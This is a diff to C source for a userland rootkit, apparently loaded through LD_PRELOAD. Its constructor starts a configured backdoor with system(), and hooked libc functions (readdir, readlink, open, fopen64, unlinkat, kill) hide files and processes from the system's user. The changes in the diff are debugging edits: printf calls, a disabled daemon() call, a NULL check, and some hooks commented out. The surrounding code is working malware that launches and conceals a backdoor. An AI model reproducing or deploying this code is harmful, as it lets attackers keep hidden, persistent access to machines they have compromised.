@@ -58,6 +58,7 @@ void _init() {
   // backdoor is not already running
   // if so we can start it up
   backdoor = find_proc(cfg.backdoor);
+  // printf("backdoor0: %s %d\n", cfg.backdoor, backdoor.alive);
   if(backdoor.alive){
 		return;
   }
@@ -74,7 +75,7 @@ void _init() {
     // daemon, 0 means child process should
     // change dir to root dir, the other 0 means 
     // child processes std in/out will be redirected to /dev/null
-    daemon(0,0);
+    // daemon(0,0);
 
     // then we execute the backdoor
     system(cfg.backdoor);
@@ -91,6 +92,10 @@ bool path_check(const char* pathname){
   debug_file("running path check");
 
   // if no config then we fine
+  // printf("backdoor: %s\n", cfg.backdoor);
+  if(cfg.backdoor == NULL){
+	  return true;
+  }
   if(strcmp(cfg.backdoor, "NONE")==0){
     return true;
   }
@@ -122,10 +127,12 @@ bool path_check(const char* pathname){
   return true;
 }
 
+
+
 // malicious syscalls
 struct dirent *readdir(DIR *dirp){
   debug_file("readdir called now!");
-
+  // printf("readdir: %x", *oreaddir);
   struct dirent *dp = oreaddir(dirp);	
   while(dp != NULL && (!path_check(dp->d_name))){ 
     dp = oreaddir(dirp);
@@ -144,9 +151,10 @@ ssize_t readlink(const char *restrict pathname, char *restrict buf, size_t bufsi
   return oreadlink(pathname, buf, bufsiz);
 }
 
-
+/*
 FILE* fopen64(const char *restrict pathname, const char *restrict mode){
   debug_file("fopen64 called!");
+  printf("ofopen: %x", *ofopen);
   if(!path_check(pathname)){
 		errno = ENOENT;
     return NULL;
@@ -157,6 +165,7 @@ FILE* fopen64(const char *restrict pathname, const char *restrict mode){
 
 int open(const char *pathname, int flags, ...){
   debug_file("open called!");
+  printf("oopen: %x", *oopen);
   if(!path_check(pathname)){
     errno = ENOENT;
     return -1;
@@ -177,7 +186,7 @@ int unlinkat(int dirfd, const char *pathname, int flags){
 
   return ounlinkat(dirfd, pathname, flags);
 }
-
+*/
 int kill(pid_t pid, int sig){
   debug_file("kill called!");
   // here it checks if someone is trying to 
